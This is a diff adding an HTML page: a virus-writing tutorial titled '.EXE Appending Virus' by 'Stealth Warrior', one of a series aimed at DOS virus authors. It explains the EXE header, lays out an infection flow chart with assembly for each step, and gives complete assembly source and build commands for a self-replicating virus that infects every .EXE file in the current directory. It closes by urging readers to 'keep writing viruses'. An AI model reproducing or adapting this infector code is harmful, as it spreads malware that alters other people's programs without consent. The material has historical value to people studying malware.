@@ -1,0 +1,472 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Stealth Warrior - .EXE Appending Virus</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>.EXE Appending Virus<BR>
+by<BR>
+Stealth Warrior/The Alliance/SLAM</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<CENTER><PRE>My E-Mail address: <A HREF="mailto:stealthwarrior@hotmail.com">stealthwarrior@hotmail.com</A></PRE></CENTER>
+
+<UL>
+<PRE> ----------------------------------------------------------------------------
+ DISCLAIMER:
+ Information included in this file is not to be used in any malicious or
+ otherwise irresponsible manner. The author is not responsible for any
+ damages, incidental or otherwise, resulting from using information from
+ this file. Responsibility is entirely placed on the reader (user).
+ ----------------------------------------------------------------------------
+
+So, now when we know how to infect .COM files, it's time to learn about .EXEs.
+First of all you have to be familiar with EXE header. It's in the beginning of
+every .EXE file and it looks like this:
+
+.--------.------------------------------------------------------------------.
+| OFFSET | DESCRIPTION                                                      |
+.--------.------------------------------------------------------------------.
+|   00h  | EXE file ID word: MZ or ZM                                       |
+| # 02h  | Number of bytes in the last page in the file                     |
+| # 04h  | Number of pages* in the file, rounded up                         |
+|   06h  | Number of entries in segment table                               |
+|   08h  | Size of the header in paragraphs**                               |
+|   0Ah  | Minimum memory allocated to file - in paragraphs                 |
+|   0Ch  | Maximum memory allocated to file - in paragraphs                 |
+| # 0Eh  | Initial offset in paragraphs to stack segment from header (SS)   |
+|   10h  | Initial offset in bytes of stack ptr from stack segment (SP)     |
+|   12h  | Negative checksum                                                |
+| # 14h  | Initial offset in bytes of instruction ptr from code segment (IP)|
+| # 16h  | Initial offset in paragraphs of code segment from header (CS)    |
+|   18h  | Offset of relocation table from start of file                    |
+|   1Ah  | Overlay number                                                   |
+.--------.------------------------------------------------------------------.
+#Important OFFSETS (for a virus)
+*page is 512 bytes long
+**paragraph is 16 bytes long
+
+What our virus has to do? First, something very important. When an EXE file is
+loaded, PSP is built, but CS doesn't point to it! Instead, it points to the
+entry point, while the DS and ES point to the PSP. That's why our virus has to
+restore initial DS and ES before passing control to the host.
+And here's flow-chart:
+  1.Calculate the delta OFFSET.
+  2.Restore parts of the header - in memory of course!
+  3.Save DTA.
+  4.Find a .EXE file. If no files found then go to step 17.
+  5.Save file attributes, date and time.
+  6.Clear file attributes.
+  7.Open the file for reading/writing.
+  8.Read the header.
+  9.Check if the file is already infected.
+     a)If already infected then go to step 16.
+     b)If not infected continue.
+ 10.Save important parts of the header for later use.
+ 11.Calculate new values for the header.
+ 12.Append the virus to the file.
+ 13.Write new header to the file.
+ 14.Restore time and date.
+ 15.Close the file.
+ 16.Restore attributes.
+ 17.Restore DTA.
+ 18.Pass the control to the host (in memory!).
+
+Here's how it's done:
+  1.Nothing new here, except there are no three bytes(0e9h,0,0) used to jump
+    to vstart.
+
+        vstart: call doit
+        doit:   pop  bp                           ;&lt;Calculate the
+                sub  bp,OFFSET doit               ; delta OFFSET.&gt;
+
+  2.And now we restore DS, ES and saved parts of the header:
+
+        push ds
+        push es
+        push cs
+        pop  ds
+        push cs
+        pop  es
+        lea  si,[bp+OFFSET orgCSIP2]
+        lea  di,[bp+OFFSET orgCSIP]
+        movsw
+        movsw
+        movsw
+        movsw
+
+  3.Nothing new...
+
+        lea  dx,[bp+OFFSET dta]           ;&lt;Save disk
+        mov  ah,1ah                       ; transfer
+        int  21h                          ; area(DTA).&gt;
+
+    We have to define dta, so:
+        dta db 42 dup (?)
+
+  4.You know this...
+
+        mov  ah,4eh                       ;Find first service.
+        lea  dx,[bp+exe_files]            ;&lt;Search for an .EXE file
+        mov  cx,7                         ; with any attributes.&gt;
+        int  21h
+
+    We have to define what exe_files means, so:
+     exe_files: db &quot;*.exe&quot;,0
+
+  5.Nothing new...
+
+        lea  si,[bp+OFFSET dta+21]        ;&lt;Save file
+        mov  cx,5                         ; attributes,
+        lea  di,[bp+OFFSET attributes]    ; date and
+        rep  movsb                        ; time.&gt;
+
+  6.Old stuff...
+
+        mov  ax,4301h                     ;&lt;Clear
+        xor  cx,cx                        ; the
+        lea  dx,[bp+dta+30]               ; file
+        int  21h                          ; attributes.&gt;
+
+  7.Nothing new here...
+
+        mov  ax,3d02h                     ;&lt;Open file for
+        lea  dx,[bp+OFFSET dta+30]        ; reading and
+        int  21h                          ; writing.&gt;
+
+  8.Here we read the header and store it to buffer. We need it to check if the
+    file is already infected and to restore it before we pass control to the
+    host.
+
+        xchg ax,bx                        ;Put file handle in bx.
+        mov  ah,3fh                       ;&lt;Read first
+        lea  dx,[bp+buffer]               ; 1ah bytes
+        mov  cx,1ah                       ; and store them
+        int  21h                          ; in buffer.&gt;
+
+  9.Here we compare our ID with the value at OFFSET 10h of the header. If it's
+    the same then the file is infected. This is an appropriate location for
+    our ID. You can use OFFSET 12h instead if you wish.
+
+        cmp  byte ptr [bp+buffer+10h],ID  ;Is the file infected?
+        jz   another                      ;Yes,so find next victim.
+
+ 10.Here we push cx (1ah=length of the header) for later use. We also save bx
+    (file handle) so that it isn't destroyed by following operations. The most
+    important thing of this part is saving all data from the header which will
+    need to be restored. It's a pretty odd way, but if you know a shorter one,
+    email me :)
+
+        mov  cx,1ah
+        push cx
+        push bx                           ;Save file handle.
+        les  ax,dword ptr [bp+buffer+14h] ;&lt;Save
+        mov  word ptr [bp+orgCSIP2],ax    ; important
+        mov  word ptr [bp+orgCSIP2+2],es  ; (for a virus)
+        les  ax,dword ptr [bp+buffer+0eh] ; parts
+        mov  word ptr [bp+orgSSSP2],es    ; of the
+        mov  word ptr [bp+orgSSSP2+2],ax  ; header.&gt;
+
+ 11.In this part we have to calculate new values to be written to the header.
+    The only tricky part is where we need the number of bytes in the last page
+    in the file. But with a bit of math it's done... Let's take a 1026-byte
+    file, for example:
+
+               PAGE 1               PAGE 2              PAGE 3
+       .--------------------.--------------------.--------------------.
+       |********************|********************|**                  |
+       .--------------------.--------------------.--------------------&Ugrave;
+                           512                 1024
+
+           OFFSET 02 : 2 ( 1026-2*(512)=2 )
+           OFFSET 04 : 3 ( 3*512&gt;1026&gt;2*512, look at the picture above)
+
+        mov  ax,word ptr [bp+buffer+8]    ;&lt;Get header
+        mov  cl,4                         ; length and
+        shl  ax,cl                        ; convert it
+        xchg ax,bx                        ; to bytes.&gt;
+        les  ax,dword ptr [bp+dta+1ah]    ;&lt;Get file
+        mov  dx,es                        ; size and
+        push ax                           ; store it
+        push dx                           ; for later.&gt;
+        sub  ax,bx                        ;&lt;Subtract header size
+        sbb  dx,0                         ; from the file size
+        mov  cx,10h                       ; and convert it to
+        div  cx                           ; SEGMENT:OFFSET form.&gt;
+        mov  word ptr [bp+buffer+14h],dx  ;New entry point.
+        mov  word ptr [bp+buffer+16h],ax  ;New OFFSET of code segment.
+        mov  word ptr [bp+buffer+0eh],ax  ;New OFFSET of stack segment.
+        mov  word ptr [bp+buffer+10h],ID  ;Our ID.
+        pop  dx                           ;&lt;Get file
+        pop  ax                           ; length.&gt;
+        pop  bx                           ;Restore file handle.
+        add  ax,vend-vstart               ;&lt;Add the size of the
+        adc  dx,0                         ; virus to the file length.&gt;
+        mov  cl,9                         ;Length of a page=512=2^9.
+        push ax                           ;&lt;Calculate
+        shr  ax,cl                        ; the new
+        ror  dx,cl                        ; number of
+        stc                               ; pages and
+        adc  dx,ax                        ; the number
+        pop  ax                           ; of bytes in
+        and  ah,1                         ; the last page.&gt;
+        mov  word ptr [bp+buffer+4],dx    ;New number of pages.
+        mov  word ptr [bp+buffer+2],ax    ;New remainder.
+        push cs                           ;&lt;Save cs and
+        pop  es                           ; restore es.&gt;
+
+ 12.And now-40h, my favorite function...
+
+        mov  ah,40h                       ;&lt;Append
+        lea  dx,[bp+OFFSET vstart]        ; the virus
+        mov  cx,vend-vstart               ; to the
+        int  21h                          ; file.&gt;
+
+ 13.Here we write a new header to the file (from the buffer):
+
+        mov  ax,4200h                     ;&lt;Go to the
+        xor  cx,cx                        ; beginning
+        cwd                               ; of the
+        int  21h                          ; file.&gt;
+        mov  ah,40h                       ;&lt;Write new
+        lea  dx,[bp+OFFSET buffer]        ; header
+        pop  cx                           ; to the
+        int  21h                          ; file.&gt;
+
+ 14.Now this looks familiar... :)
+
+        mov  ax,5701h                     ;&lt;Restore
+        mov  dx,word ptr [bp+date]        ; original
+        mov  cx,word ptr [bp+time]        ; file time
+        int  21h                          ; and date.&gt;
+
+ 15.Close the file, nothing new...
+
+        mov  ah,3eh                       ;&lt;Close the
+        int  21h                          ; file.&gt;
+
+ 16.Blah, blah...
+
+        mov  ax,4301h                     ;&lt;Restore
+        lea  dx,[bp+OFFSET dta+30]        ; original
+        xor  ch,ch                        ; attributes
+        mov  cl,byte ptr [bp+attributes]  ; of the
+        int  21h                          ; file.&gt;
+
+ 17.Nothin' new...
+
+        mov  dx,80h                       ;Restore DTA.
+        mov  ah,1ah                       ;&lt;Set disk transfer
+        int  21h                          ; address.&gt;
+
+ 18.Here we pass control to the host (in memory!!!):
+
+        pop  es                           ;Restore es.
+        pop  ds                           ;Restore ds.
+        mov  ax,es                        ;ax&lt;-PSP segment.
+        add  ax,10h                       ;Adjust it for PSP.
+        add  word ptr cs:[bp+orgCSIP+2],ax;
+        add  ax,word ptr cs:[bp+orgSSSP+2];
+        cli                               ;Clear int's for stack manipulation.
+        mov  sp,word ptr cs:[bp+orgSSSP]  ;Adjust sp.
+        mov  ss,ax                        ;Adjust ss.
+        sti
+        db   0eah                         ;Return control to the host.
+
+    We also need this:
+
+        orgCSIP dd ?                              ;Original CS:IP.
+        orgSSSP dd ?                              ;Original SS:SP.
+        orgCSIP2 dd 0fff00000h                    ;Needed for carrier file.
+        orgSSSP2 dd ?
+
+
+Here's the complete source:
+-&lt;EXAMPLE1.ASM&gt;---------------------------------------------------------------
+;Example 1 from .EXE Appending Virus Tutorial by Stealth Warrior
+;.EXE appending virus - 342 bytes long, infects all .EXE files in current dir
+;Instructions:
+; TASM /m EXAMPLE1.ASM
+; TLINK /t EXAMPLE1.ASM
+.model tiny
+.code
+        org 100h
+ID = 'SW'                                 ;Our ID...
+vstart: call doit
+doit:   pop  bp                           ;&lt;Calculate the
+        sub  bp,OFFSET doit               ; delta OFFSET.&gt;
+        push ds
+        push es
+        push cs
+        pop  ds
+        push cs
+        pop  es
+        lea  si,[bp+OFFSET orgCSIP2]
+        lea  di,[bp+OFFSET orgCSIP]
+        movsw
+        movsw
+        movsw
+        movsw
+        lea  dx,[bp+OFFSET dta]           ;&lt;Save disk
+        mov  ah,1ah                       ; transfer
+        int  21h                          ; area(DTA).&gt;
+first:  mov  ah,4eh                       ;Find first service.
+        lea  dx,[bp+exe_files]            ;&lt;Search for a .EXE file
+        mov  cx,7                         ; with any attributes.&gt;
+next:   int  21h
+        jnb  got_it                       ;We found a .EXE file.
+        jmp  quit                         ;No more .EXE files,so quit.
+got_it: lea  si,[bp+OFFSET dta+21]        ;&lt;Save file
+        mov  cx,5                         ; attributes,
+        lea  di,[bp+OFFSET attributes]    ; date and
+        rep  movsb                        ; time.&gt;
+        mov  ax,4301h                     ;&lt;Clear
+        xor  cx,cx                        ; the
+        lea  dx,[bp+dta+1eh]              ; file
+        int  21h                          ; attributes.&gt;
+        mov  ax,3d02h                     ;&lt;Open file for
+        lea  dx,[bp+OFFSET dta+1eh]       ; reading and
+        int  21h                          ; writing.&gt;
+        xchg ax,bx                        ;Put file handle in ax.
+        mov  ah,3fh                       ;&lt;Read first
+        lea  dx,[bp+OFFSET buffer]        ; 1ah bytes and
+        mov  cx,1ah                       ; save them to
+        int  21h                          ; buffer.&gt;
+        mov  ax,4202h                     ;&lt;Go to
+        xor  cx,cx                        ; the
+        cwd                               ; end of
+        int  21h                          ; file.&gt;
+        cmp  word ptr [bp+buffer+10h],ID  ;Already infected?
+        jnz  infect                       ;No,so infect it.
+        jmp  another                      ;Yes,so get another.
+infect: mov  cx,1ah
+        push cx
+        push bx                           ;Save file handle.
+        les  ax,dword ptr [bp+buffer+14h] ;&lt;Save
+        mov  word ptr [bp+orgCSIP2],ax    ; important
+        mov  word ptr [bp+orgCSIP2+2],es  ; (for a virus)
+        les  ax,dword ptr [bp+buffer+0eh] ; parts
+        mov  word ptr [bp+orgSSSP2],es    ; of the
+        mov  word ptr [bp+orgSSSP2+2],ax  ; header.&gt;
+        mov  ax,word ptr [bp+buffer+8]    ;&lt;Get header
+        mov  cl,4                         ; length and
+        shl  ax,cl                        ; convert it
+        xchg ax,bx                        ; to bytes.&gt;
+        les  ax,dword ptr [bp+dta+1ah]    ;&lt;Get file
+        mov  dx,es                        ; size and
+        push ax                           ; store it
+        push dx                           ; for later.&gt;
+        sub  ax,bx                        ;&lt;Subtract header size
+        sbb  dx,0                         ; from the file size
+        mov  cx,10h                       ; and convert it to
+        div  cx                           ; SEGMENT:OFFSET form.&gt;
+        mov  word ptr [bp+buffer+14h],dx  ;New entry point.
+        mov  word ptr [bp+buffer+16h],ax  ;New OFFSET of code segment.
+        mov  word ptr [bp+buffer+0eh],ax  ;New OFFSET of stack segment.
+        mov  word ptr [bp+buffer+10h],ID  ;Our ID.
+        pop  dx                           ;&lt;Get file
+        pop  ax                           ; length.&gt;
+        pop  bx                           ;Restore file handle.
+        add  ax,vend-vstart               ;&lt;Add the size of the
+        adc  dx,0                         ; virus to the file length.&gt;
+        mov  cl,9                         ;Length of a page=512=2^9.
+        push ax                           ;&lt;Calculate
+        shr  ax,cl                        ; the new
+        ror  dx,cl                        ; number of
+        stc                               ; pages and
+        adc  dx,ax                        ; the number
+        pop  ax                           ; of bytes in
+        and  ah,1                         ; the last page.&gt;
+        mov  word ptr [bp+buffer+4],dx    ;New number of pages.
+        mov  word ptr [bp+buffer+2],ax    ;New remainder.
+        push cs                           ;&lt;Save cs and
+        pop  es                           ; restore es.&gt;
+        mov  ah,40h                       ;&lt;Append
+        lea  dx,[bp+OFFSET vstart]        ; the virus
+        mov  cx,vend-vstart               ; to the
+        int  21h                          ; file.&gt;
+        mov  ax,4200h                     ;&lt;Go to the
+        xor  cx,cx                        ; beginning
+        cwd                               ; of the
+        int  21h                          ; file.&gt;
+        mov  ah,40h                       ;&lt;Write new
+        lea  dx,[bp+OFFSET buffer]        ; header
+        pop  cx                           ; to the
+        int  21h                          ; file.&gt;
+        mov  ax,5701h                     ;&lt;Restore
+        mov  dx,word ptr [bp+date]        ; original
+        mov  cx,word ptr [bp+time]        ; file time
+        int  21h                          ; and date.&gt;
+        mov  ah,3eh                       ;&lt;Close the
+        int  21h                          ; file.&gt;
+another:mov  ax,4301h                     ;&lt;Restore
+        lea  dx,[bp+OFFSET dta+1eh]       ; original
+        xor  ch,ch                        ; attributes
+        mov  cl,byte ptr [bp+attributes]  ; of the
+        int  21h                          ; file.&gt;
+        mov  ah,4fh                       ;Find next service.
+        jmp  next                         ;Do it.
+quit:   mov  dx,80h                       ;Restore DTA.
+        mov  ah,1ah                       ;&lt;Set disk transfer
+        int  21h                          ; address.&gt;
+        pop  es                           ;Restore es.
+        pop  ds                           ;Restore ds.
+        mov  ax,es                        ;ax&lt;-PSP segment.
+        add  ax,10h                       ;Adjust it for PSP.
+        add  word ptr cs:[bp+orgCSIP+2],ax
+        add  ax,word ptr cs:[bp+orgSSSP+2]
+        cli                               ;Clear int's for stack manipulation.
+        mov  sp,word ptr cs:[bp+orgSSSP]  ;Adjust sp.
+        mov  ss,ax                        ;Adjust ss.
+        sti
+        db   0eah                         ;Return control to the host.
+
+orgCSIP dd ?                              ;Original CS:IP.
+orgSSSP dd ?                              ;Original SS:SP.
+orgCSIP2 dd 0fff00000h                    ;Needed for carrier file.
+orgSSSP2 dd ?
+
+exe_files db '*.exe',0
+vend equ $                                ;&lt;Everything below this point
+                                          ; isn't written to a host because
+                                          ; it's temporal info and would
+                                          ; just increase the size of the
+                                          ; virus.&gt;
+attributes db ?                           ;Here we put file attributes.
+time dw ?                                 ;Here we put file time.
+date dw ?                                 ;Here we put file date.
+dta db 42 dup (?)                         ;Here we put DTA.
+buffer db 1ah dup (?)                     ;Here we put header.
+end vstart
+------------------------------------------------------------------------------
+
+That's it for EXE infectors. If you don't get it yet, read all my previous
+tutorials and you'll get it, don't worry. Stay tuned for new tutorials by me!
+Oh yeah, keep writing viruses!
+
+You can get all my tutorials and more at my page - see the beginning of this
+file for the address.
+
+Greetz'n'thanx to:
+  -The Alliance : Yo to all memberz
+  -P/S : a great group, your(Dark Angel) tutorials and 40hex helped me a lot
+         BTW where's 40Hex 15?
+  -NuKE : a great group too, Rock Steady's tutorials are cool
+  -VLAD : a great magazine, guys-I hope #7 isn't the last one...
+  -Immortal Riot/Genesis : I like your 'zine
+  -Ratboy : cool tutorial
+  -all other wirus writers in the world!
+  -Rage Against The Machine, Ministry, Biohazard, Jimi Hendrix : I listened to
+   your music while I was writing these tutorials</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
